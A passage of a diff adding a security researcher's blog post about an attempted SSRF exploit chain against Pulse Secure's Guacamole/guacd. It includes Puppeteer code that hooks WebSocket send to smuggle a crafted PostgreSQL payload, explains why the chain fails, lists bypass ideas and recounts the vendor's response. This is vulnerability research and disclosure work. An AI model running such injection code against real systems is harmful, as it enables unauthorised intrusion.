+        var payload = &quot;\x00\x00\x00\x08\x04\xd2\x16\x2f\x00\x00\x00\x54\x00\x03\x00\x00\x75\x73\x65\x72\x00\x70\x6f\x73\x74\x67\x72\x65\x73\x00\x64\x61\x74\x61\x62\x61\x73\x65\x00\x70\x6f\x73\x74\x67\x72\x65\x73\x00\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x5f\x6e\x61\x6d\x65\x00\x70\x73\x71\x6c\x00\x63\x6c\x69\x65\x6e\x74\x5f\x65\x6e\x63\x6f\x64\x69\x6e\x67\x00\x55\x54\x46\x38\x00\x00\x51\x00\x00\x00\x16\x53\x45\x4c\x45\x43\x54\x20\x76\x65\x72\x73\x69\x6f\x6e\x28\x29\x3b\x00&quot;
+        var must_send = true
+        var base64 = btoa(payload)
+        var final_payload = &quot;9.clipboard,1.0,10.text/plain;4.blob,1.0,&quot; + base64.length + &quot;.&quot; + base64 + &quot;;3.end,1.0;3.key,5.65507,1.1;&quot;
+        const originalSend = WebSocket.prototype.send
+        WebSocket.prototype.send = function(...args) {
+            if (must_send) {
+                console.log(final_payload);
+                originalSend.call(this, ...[final_payload])
+                must_send = false
+            }
+            console.log(args)
+            return originalSend.call(this, ...args)
+        }
+    })
+
+    // Keep it open, ease our debug process :)
+    // await browser.close()
+})();
+</code></pre>
+
+<p>It&rsquo;s mostly clicks and keystrokes, but there is one really interesting part I want to detail. I first wanted to get a handle on the websocket, and send things on the way, but I could find no easy way to just list currently opened websockets! So a cool workaround is to &ldquo;attack ourselves&rdquo; with a self prototype pollution.</p>
+
+<p>Long story short, we&rsquo;re hooking the WebSocket&rsquo;s send method so we can inject arbitrary bytes to be sent at runtime.</p>
+
+<ol>
+<li>We save the original send method</li>
+<li>We overwrite the send function of the main WebSocket object, every newly created websocket will inherit from this method</li>
+<li>We send our arbitrary bytes, here stored in <code>final_payload</code></li>
+<li>We send the bytes that were supposed to be sent by the initial send call, that way guacd remains happy (and alive)</li>
+</ol>
+
+<p>The payload sent is the PostgreSQL payload we tested earlier.</p>
+
+<p><img class="img_full" src="png-22.png" alt="png-22"></p>
+
+<p>Here&rsquo;s the complete exploit chain, it goes woosh-woosh click-click!</p>
+
+<video class="img_full" controls>
+  <source src="pulse-puppeteer-demo.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
+<h1 id="5-literally-failing-on-a-challenge">5. Literally Failing on a Challenge</h1>
+
+<p>Yup, no shell. The demo fails. But why? <br />
+Once the payload is submitted, we&rsquo;re left with the following message:</p>
+
+<p><code>FATALC2000Mno pg_hba.conf entry for host X.X.X.X, user, pass, ...</code></p>
+
+<p>The exploit we proved functional was tested in a docker instance, but I also tested the byte replay inside the pulse VM and it worked. So what are we missing here? What The Heck??</p>
+
+<p><img class="img_full" src="png-24.png" alt="png-24"></p>
+
+<p>There is one slight difference, can you spot it? <br />
+Please don&rsquo;t mind the length, from, and to indicators, they&rsquo;re not related to what I want to show, just a side effect on how the data is sent.</p>
+
+<p>So? Any clue? Not really? Yup. It took me a few days to try different approach, and at some point it hit me:</p>
+
+<p><code>Maybe I should google this error?!</code></p>
+
+<p><img class="img_full" src="png-26.png" alt="png-26"></p>
+
+<p>The error seems to be related to the source IP hitting PostgreSQL. But we have an SSRF, we&rsquo;re from loopback, to loopback, right? Riiight?</p>
+
+<p>It turns out that socat has no feature to print the source IP, but it can be displayed by using the env variables socat sets.</p>
+
+<p>There it is. The small difference. Our nightmare. <br />
+Guacd sends our bytes, it can reach the loopback, but it sends them from the <code>public IP</code>. How come? Why? Fuuuuuuuu!</p>
+
+<p><img class="img_full" src="png-27.png" alt="png-27"></p>
+
+<p>By reading the configuration file, it gets even clearer, the loopback is trusted, no authentication, it just works. Meanwhile for the public IP, there is no entry (literally what the error tells us, <em>sigh</em>).</p>
+
+<p>So this whole exploit chain fails for this specific detail.</p>
+
+<p><img class="img_full" src="png-28.png" alt="png-28"></p>
+
+<p>Picture me, 7a.m, a few nights spent on this, many expectations&hellip; And this.</p>
+
+<p><img class="img_full" src="png-29.png" alt="png-29"></p>
+
+<h1 id="6-is-it-worth-bypassing">6. Is it Worth Bypassing?</h1>
+
+<p>One could think that this is a dead-end, but it&rsquo;s <code>always</code> a matter of time. A bypass can always be found, but is it worth the time it&rsquo;ll cost?</p>
+
+<p><img class="img_full" src="png-31.png" alt="png-31"></p>
+
+<p>It sure is an interesting exercice, but I don&rsquo;t think it&rsquo;s really worth bypassing for the following reasons:</p>
+
+<ul>
+<li>The post-auth exploits already work up to the version 9.1R09</li>
+<li>Guacamole gets <code>deprecated</code> (yes I&rsquo;m sad) on 9.1R13</li>
+<li>It leaves us a 1 year vulnerable and userful time span, post-auth, for something that&rsquo;s not a 0-day anymore.. Why bother?</li>
+</ul>
+
+<p>That being said, I have <code>a few bypass ideas</code> to try, and I&rsquo;m still willing to invite someone for a guest post, so if you want to give it a try.. :)</p>
+
+<ul>
+<li>Could IPv6 be used in the SSRF? How does guacd handle this? Can we reach PostgreSQL?</li>
+<li>Can we find another bypass to reach PostgreSQL, or overwrite its configuration?</li>
+<li>There are many python scripts exposing ports on the loopback, what are they really doing?</li>
+<li>Guacd is a plain C++ project and has already been the target of many binary exploits. Maybe now is the right time to start fuzzers?</li>
+<li>Can we try to have a valid handshake? A two-way ssrf (also called port forward)? Use an OCR? How to deal with non-printable bytes in the screenshots we receive?</li>
+</ul>
+
+<h1 id="7-last-words">7. Last Words</h1>
+
+<p>That&rsquo;s it about the technical part! But not for the human part, and of course this matters as well! ^.^</p>
+
+<p>A few days after the initial release of the guacamole blogpost, Ivanti folks (company in charge of pulse) reached out and were really willing to do things the right way.</p>
+
+<p>Mr. R. was really polite, helpful, trying to determine if this would impact customers, offered to setup a meeting with the right technical employee, and even offered some goodies. Shhh, it&rsquo;s not corruption, it&rsquo;s.. It&rsquo;s&hellip; Hoodies!</p>
+
+<p>It really made my day to have someone dealing with this proactively, without any accusation, just trying to do the right thing. Please, keep up the good work!</p>
+
+<p><img class="img_full" src="png-33.png" alt="png-33"></p>
+
+<p>Finally, yes, guacamole is really gone.. We can ensure that by two things:</p>
+
+<ol>
+<li>It&rsquo;s gone from the UI, so this is a hint but not a proof</li>
+<li>Running <code>find</code> and matching on <code>guacd</code> has like 200 matches on the old versions, and 2 on the last one. Maybe these old unused libs could be remove? :)</li>
+</ol>
+
+<blockquote>
+<p>I actually corrupted my recent VM snapshot before taking the last screenshots, and the setup takes time.. Fact-check me if you like, I&rsquo;m not taking one more hour setting up a VPN for a screenshot. ^^&rsquo;</p>
+</blockquote>
+
+<p><img class="img_full" src="png-34.png" alt="png-34"></p>
+
+<p>Is pulse any better now? Is it still worth looking for vulnerabilities?</p>
+
+<p>Dude, Pal, Sir, yes. <br />
+It&rsquo;s (sorry..) a mess. A cgi-server that invokes custom perl scripts, that calls python scripts, that eventually load old .so libraries that have never been hardened nor fuzzed much. Are we really in 2021? Feels like 2000, so <code>go for it</code>, there are too many components, protocols, and features for this to end up being secure! :)</p>
+
+<p><img class="img_full" src="png-35.png" alt="png-35"></p>
+
+<p>Once again, thank you for spending a few minutes reading what I spent weeks to find, I hope you&rsquo;ve had fun!</p>
+
+<p>Kudos to the <a href="https://twitter.com/sigsegv_event">RTFMeet</a>&rsquo;s staff for the cool events, to <a href="https://www.instagram.com/fitfait_bienfait/">@FitFait_BienFait</a> for feeding me while I spend too many nights on this, and to my colleague Grumpy Old Hacker for the LILO tips!</p>
+
+<p>Have a marvelous day, go break stuff, and remember to spend some time helping newcomers! ^.^</p>
+
+<p><img class="img_full" src="png-36.png" alt="png-36"></p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/hacking/hacking_guacamole_to_trigger_avocado/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">RCE with SSRF and File Write as an exploit chain on Apache Guacamole</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
